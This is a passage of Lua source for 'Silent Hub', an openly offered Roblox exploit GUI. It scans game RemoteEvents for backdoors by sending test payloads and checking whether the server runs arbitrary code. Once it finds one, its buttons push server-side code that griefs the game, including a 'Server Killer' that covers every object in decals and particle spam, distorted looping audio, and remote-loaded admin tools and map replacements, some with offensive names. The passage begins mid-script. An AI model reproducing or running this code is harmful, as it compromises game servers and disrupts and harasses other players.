	sound.Pitch = 1 --Speed of Playback
	sound.Looped = true
	sound.archivable = false
	
	distortion.Level = 0.9
	 
	sound.Parent = game.Workspace
	distortion.Parent = sound
	 
	wait(0)
	 
	sound:play()
			
			]])
		end},
		
		{"Zalgo", function(button)
			execute('require(5195961797).eliza("' .. player .. '")')
		end},
		
		{"c00lkiddify [Server Killer]", function(button)
			execute([[
			id = 158118263
	
	for _, v in pairs(game.Workspace:GetDescendants()) do
	    local p = Instance.new("ParticleEmitter")
		faces = {"Front", "Back", "Right", "Left", "Top", "Bottom"}
		local decals = {}
		
	    p.Name = "c00l"
	    p.Texture = "rbxassetid://" ..id
	    p.Parent = v
		
		
		for i, face in ipairs(faces) do
			local decal = Instance.new("Decal", v)
			decal.Texture = "rbxassetid://" .. id
			decal.Face = face
			table.insert(decals, decal)
		end
	end
	
	local s = Instance.new("Sky", game.Lighting)
	
	s.SkyboxBk = "rbxassetid://" .. id
	s.SkyboxDn = "rbxassetid://" .. id
	s.SkyboxFt = "rbxassetid://" .. id
	s.SkyboxLf = "rbxassetid://" .. id
	s.SkyboxRt = "rbxassetid://" .. id
	s.SkyboxUp = "rbxassetid://" .. id
	
	
			]])
		end},
		
		{"Reality Orb [R6]", function(button)
			execute('require(4780399515).load("' .. player .. '")')
		end},
		
		{"Lava Knight [R6]", function(button)
			execute('require(5813766312).load("' .. player .. '")')
		end},
		
		{"Gravity Hammer [R6]", function(button)
			execute('require(4702851632).load("' .. player .. '")')
		end},
		
		{"Lighting Cannon [R6]", function(button)
			execute('require(12750218971)("' .. player .. '")')
		end}
	}
	
	for _, item in ipairs(scripts) do
		create(unpack(item))
	end
end;
task.spawn(C_42);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.SearchBox.LocalScript
local function C_4a()
local script = G2L["4a"];
	local input = script.Parent
	local container = input.Parent:WaitForChild("ButtonContainer")
	
	local function update()
		local text = string.lower(input.Text)
	
		for _, button in ipairs(container:GetChildren()) do
			if (button:IsA("TextButton") or button:IsA("TextLabel")) and button.Name ~= "Button" then
				local buttontext = string.lower(button.Text)
	
				if string.find(buttontext, text, 1, true) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_4a);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.LocalScript
local function C_4d()
local script = G2L["4d"];
	local player = game.Players.LocalPlayer.Name
	local page = script.Parent
	local RemotePath = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemotePath")
	local RemoteFound = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemoteFound")
	local template = page.Button
	
	template.Visible = false
	
	while not RemoteFound.Value do
		RemoteFound.Changed:Wait()
	end
	
	while RemotePath.Value == "" do
		RemotePath:GetPropertyChangedSignal("Value"):Wait()
	end
	
	local path = RemotePath.Value
	
	if not path or path == "" then
		warn("Silent Hub: No remote path acquired yet!")
		return
	end
	
	local remote = game
	
	for segment in path:gmatch("[^.]+") do
		remote = remote:FindFirstChild(segment)
		if not remote then
			warn("Couldn't find:", segment)
			return
		end
	end
	
	if not remote then
		return
	end
	
	local function create(name, func)
		local button = template:Clone()
		button.Name = name
		button.Text = name
		button.Visible = true
		button.Parent = page
	
		button.MouseButton1Click:Connect(function()
			func(button)
		end)
	end
	
	local function execute(code)
		local code = [[
		 ]] .. code .. [[
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	local scripts = {
		{"Dex", function(button)
			execute('require(14572394952)("' .. player .. '")')
		end},
		
		{"Stratosphere", function(button)
			execute('require(6535776034).load("' .. player .. '")')
		end},
		
		{"T0PK3K", function(button)
			execute('require(0x342D5F0DA)("' .. player .. '")')
		end},
		
		{"YourMom GUI", function(button)
			execute('require(120133869038302).YourMom("' .. player .. '")')
		end},
		
		{"c00lgui", function(button)
			execute('require(139332781079625).c00lgui("' .. player .. '", "c00lkidd")')
		end},
		
	}
	
	for _, item in ipairs(scripts) do
		create(unpack(item))
	end
end;
task.spawn(C_4d);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.SearchBox.LocalScript
local function C_55()
local script = G2L["55"];
	local input = script.Parent
	local container = input.Parent:WaitForChild("ButtonContainer")
	
	local function update()
		local text = string.lower(input.Text)
	
		for _, button in ipairs(container:GetChildren()) do
			if (button:IsA("TextButton") or button:IsA("TextLabel")) and button.Name ~= "Button" then
				local buttontext = string.lower(button.Text)
	
				if string.find(buttontext, text, 1, true) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_55);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.LocalScript
local function C_58()
local script = G2L["58"];
	local player = game.Players.LocalPlayer.Name
	local page = script.Parent
	local RemotePath = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemotePath")
	local RemoteFound = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemoteFound")
	local template = page.Button
	
	template.Visible = false
	
	while not RemoteFound.Value do
		RemoteFound.Changed:Wait()
	end
	
	while RemotePath.Value == "" do
		RemotePath:GetPropertyChangedSignal("Value"):Wait()
	end
	
	local path = RemotePath.Value
	
	if not path or path == "" then
		warn("Silent Hub: No remote path acquired yet!")
		return
	end
	
	local remote = game
	
	for segment in path:gmatch("[^.]+") do
		remote = remote:FindFirstChild(segment)
		if not remote then
			warn("Couldn't find:", segment)
			return
		end
	end
	
	if not remote then
		return
	end
	
	local function create(name, func)
		local button = template:Clone()
		button.Name = name
		button.Text = name
		button.Visible = true
		button.Parent = page
	
		button.MouseButton1Click:Connect(function()
			func(button)
		end)
	end
	
	local function execute(code)
		local code = [[
		 ]] .. code .. [[
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	local scripts = {
		{"KFC", function(button)
			execute('require(3615713971).load()')
		end},
		
		{"Redwood Prison", function(button)
			execute('require(3161149041+1).redwood()')
		end},
		
		{"Nazi Map", function(button)
			execute('require(139666139485072).load("' .. player .. '")')
		end},
		
		{"Natural Disaster Survival", function(button)
			execute('require(14704225060).nds()')
		end},
		
		{"Prison Life", function(button)
			execute('require(14314506567).Load()')
		end},
		
		{"Crossroads", function(button)
			execute('require(3339279811).load("' .. player .. '")')
		end},
		
		{"Roblox Headquarters", function(button)
			execute('require(17110658137).asd("' .. player .. '")')
		end},
		
		{"Brookhaven", function(button)
			execute('require(110191289672557).brookhaven()')
		end},
	
		{"Ohio Map", function(button)
			execute('require(14288620360).ohiov2("' .. player .. '")')
		end},
		
		{"Sword Fight on the Heights Original", function(button)
			execute('require(84779642132074).loadmap()')
		end},
		
		{"Tubers93's Mosque", function(button)
			execute('require(131945008071397).map("' .. player .. '")')
		end},
		
		{"McDonald's", function(button)
			execute('require(3168737443).load("' .. player .. '")')
		end},
		
		{"Clockwork Arena", function(button)
			execute('require(13887518057)()')
		end},
	}
	
	for _, item in ipairs(scripts) do
		create(unpack(item))
	end
end;
task.spawn(C_58);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Red.LocalScript
local function C_68()
local script = G2L["68"];
	local input = script.Parent
	local main = input.Parent.Parent.Parent.Parent
	
	local function update()
		local num = tonumber(input.Text)
		if not num then return end
		main.BackgroundColor3 = Color3.new(num / 255, main.BackgroundColor3.G, main.BackgroundColor3.B)
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_68);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Green.LocalScript
local function C_6b()
local script = G2L["6b"];
	local input = script.Parent
	local main = input.Parent.Parent.Parent.Parent
	
	local function update()
		local num = tonumber(input.Text)
		if not num then return end
		main.BackgroundColor3 = Color3.new(main.BackgroundColor3.R, num / 255, main.BackgroundColor3.B)
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_6b);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Blue.LocalScript
local function C_6e()
local script = G2L["6e"];
	local input = script.Parent
	local main = input.Parent.Parent.Parent.Parent
	
	local function update()
		local num = tonumber(input.Text)
		if not num then return end
		main.BackgroundColor3 = Color3.new(main.BackgroundColor3.R, main.BackgroundColor3.G, num / 255)
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_6e);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.Scale.LocalScript
local function C_73()
local script = G2L["73"];
	local input = script.Parent
	local main = input.Parent.Parent.Parent.Parent
	
	local function update()
		if input.Text == "" then
			main.UIScale.Scale = 1
			return
		end
	
		local num = tonumber(input.Text)
	
		if not num or num <= 0 or num ~= num or math.abs(num) == math.huge then
			return
		end
	
		main.UIScale.Scale = num
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_73);
-- StarterGui.SilentHub.Scripts.Loader
local function C_83()
local script = G2L["83"];
	if _G.SilentHubLoaded then return end
	_G.SilentHubLoaded = true
	
	local beta = false
	
	local HttpService = game:GetService("HttpService")
	local TweenService = game:GetService("TweenService")
	
	local maincontainer = script.Parent.Parent.UI:WaitForChild("MainContainer")
	local openbutton = script.Parent.Parent.UI:WaitForChild("Open")
	local scale = maincontainer.UIScale
	
	local settings = maincontainer.PageContainer.Settings
	local rainbowtoggle = settings.RainbowContainer.Rainbow
	local savebutton = settings.ButtonContainer.SaveSettings
	local resetbutton = settings.ButtonContainer.ResetSettings
	
	local remotefound = script.Parent.Parent.Values.RemoteFound
	local remotepath = script.Parent.Parent.Values.RemotePath
	
	local AcquiredRemote = nil
	local isAcquiring = false
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local rainbowinfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local rainbowenabled = maincontainer.Parent.Parent.Values.RainbowEnabled
	local rainbowrunning = false
	
	local foldername = "Silent Hub"
	local filename = foldername .. "/Settings.txt"
	
	local start
	
	local attach
	local reattach
	
	local mainsettings = {}
	
	local defaultsettings = {
		RedColor = 50/255,
		GreenColor = 50/255,
		BlueColor = 50/255,
		Scale = 1,
		Rainbow = false
	}
	
	openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
	
	local function ensurefolder()
		if typeof(isfolder) == "function" and typeof(makefolder) == "function" then
			if not isfolder(foldername) then
				makefolder(foldername)
			end
		end
	end
	
	local function readsettings()
		if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then
			return defaultsettings
		end
	
		if not isfile(filename) then
			return defaultsettings
		end
	
		local success, data = pcall(function()
			return HttpService:JSONDecode(readfile(filename))
		end)
	
		if success and type(data) == "table" then
			return data
		end
	
		return defaultsettings
	end
	
	local function writesettings(data)
		if typeof(writefile) ~= "function" then return end
		ensurefolder()
		writefile(filename, HttpService:JSONEncode(data))
	end
	
	local function applysettings(data)
		maincontainer.BackgroundColor3 = Color3.new(
			data.RedColor or 50/255,
			data.GreenColor or 50/255,
			data.BlueColor or 50/255
		)
		
		scale.Scale = data.Scale or 1
		rainbowenabled.Value = data.Rainbow or false
	end
	
	local function loadsettings()
		ensurefolder()
		mainsettings = readsettings()
		applysettings(mainsettings)
	end
	
	local function resetsettings()
		mainsettings = table.clone(defaultsettings)
		writesettings(mainsettings)
		applysettings(mainsettings)
	end
	
	local function savesettings()
		local data = {
			RedColor = maincontainer.BackgroundColor3.R,
			GreenColor = maincontainer.BackgroundColor3.G,
			BlueColor = maincontainer.BackgroundColor3.B,
			Scale = scale.Scale,
			Rainbow = rainbowenabled.Value
		}
	
		mainsettings = data
		writesettings(data)
	end
	
	local function load()
		for i, v in pairs(maincontainer.PageContainer:GetChildren()) do
			if v:IsA("Frame") then
				v.Visible = false
			end
		end
	
		TweenService:Create(openbutton, info, {Position = UDim2.new(0, 0, 0.75, 0)}):Play()
	
		loadsettings()
	
		if typeof(writefile) ~= "function" then return end
		ensurefolder()
		writefile("Silent Hub/README.txt", [[
	Thank you for using Silent Hub as your backdoor scanner!
		
	Want scripts or more features added?
	
	Join our Discord for support, donations and more!
	
	Discord: https://dsc.gg/teamc00lkidd
	Roblox: https://www.roblox.com/groups/34005867
	YouTube: https://youtube.com/@team.c00lkidd
		]])
	end
	
	local function attach()
		if isAcquiring or AcquiredRemote then return end
		isAcquiring = true
	
		start = tick()
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Scanning for remotes, check console for info"
		})
	
		local ignored = game:FindFirstChild("RobloxReplicatedStorage")
		local tested = 0
	
		for pass = 1, 2 do
		for _, remote in ipairs(game:GetDescendants()) do
			if AcquiredRemote then break end
	
			if remote:IsA("RemoteEvent")
				and remote.Name ~= "UpdateCurrentCall"
				and (not ignored or not remote:IsDescendantOf(ignored))
			then
				tested += 1
	
				print("\nPath: game." .. remote:GetFullName() .."\nType: " .. remote.ClassName)
	
				local id = "Silent-" .. HttpService:GenerateGUID(false)
	
				local code = ([[local f=Instance.new("Folder")
	f.Name=%q
	f.Parent=game.JointsService
	task.delay(3,function() if f.Parent then f:Destroy() end end)]]):format(id)
	
					if remote:IsA("RemoteEvent") then
						pcall(function()
							remote:FireServer(code)
						end)
					else
						task.spawn(function()
							pcall(function()
								remote:InvokeServer(code)
							end)
						end)
					end
					
				wait(0.1)
	
				local deadline = tick() + 0.5
				repeat
					if game.JointsService:FindFirstChild(id) then
						AcquiredRemote = remote
						remotefound.Value = true
						remotepath.Value = remote:GetFullName()
	
						print("\nRemote Found!\nPath: game." .. remote:GetFullName() .."\nType: " .. remote.ClassName)
	
						AcquiredRemote = remote
						remotefound.Value = true
						remotepath.Value = remote:GetFullName()
	
						reattach(remote)
	
						load()
	
						game:GetService("StarterGui"):SetCore("SendNotification", {
							Title = "Silent Hub",
							Text = ("Backdoor found in %.2fs!"):format(tick() - start)
						})
	
						isAcquiring = false
						print("Tested " .. tested .. " remotes.")
						return
					end
	
					wait(0.05)
				until tick() >= deadline
			end
		end
			if AcquiredRemote then
				break
			end
	
			if pass == 1 then
				print("No backdoor found on first pass, rescanning...")
				wait(0.25)
			end
		end
	
		print("Tested " .. tested .. " remotes.")
	
		isAcquiring = false
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Backdoor not found."
		})
		maincontainer.Parent.Parent:Destroy()
	end
	
	function reattach(remote)
		local conn
	
		conn = remote.AncestryChanged:Connect(function(_, parent)
			if parent then
				return
			end
	
			conn:Disconnect()
	
			if AcquiredRemote ~= remote then
				return
			end
	
			AcquiredRemote = nil
			remotefound.Value = false
			remotepath.Value = ""
	
			print("Remote removed. Reattaching...")
	
			task.spawn(attach)
		end)
	end
	
	function rainbow()
		if rainbowrunning then return end
		rainbowrunning = true
	
		local colors = {
			Color3.fromRGB(255, 0, 0),
			Color3.fromRGB(255, 170, 0),
			Color3.fromRGB(255, 255, 0),
			Color3.fromRGB(0, 255, 0),
			Color3.fromRGB(0, 255, 255),
			Color3.fromRGB(0, 0, 255),
			Color3.fromRGB(127, 0, 255),
			Color3.fromRGB(255, 0, 255),
		}
	
		while rainbowenabled.Value do
			for _, color in ipairs(colors) do
				if not rainbowenabled.Value then
					break
				end
	
				local tween = TweenService:Create(
					maincontainer,
					rainbowinfo,
					{BackgroundColor3 = color}
				)
	
				tween:Play()
				tween.Completed:Wait()
			end
		end
	
		rainbowrunning = false
	end
	
	task.spawn(function()
		if not game:IsLoaded() then
			game.Loaded:Wait()
		end
	
		wait(2)
		attach()
	end)
	
	if beta == true then
		maincontainer.Header.TextLabel.Text = "Silent Hub BETA"
	end
	
	rainbowtoggle.MouseButton1Click:Connect(function()
		local defaultbackground = Color3.new(
			50/255,
			50/255,
			50/255
		)
		
		rainbowenabled.Value = not rainbowenabled.Value
	
		if rainbowenabled.Value == true then
			task.spawn(rainbow)
		else
			TweenService:Create(
				maincontainer,
				rainbowinfo,
				{BackgroundColor3 = defaultbackground}
			):Play()
		end
	end)
	
	savebutton.MouseButton1Click:Connect(savesettings)
	resetbutton.MouseButton1Click:Connect(resetsettings)
end;
task.spawn(C_83);

return G2L["1"], require;
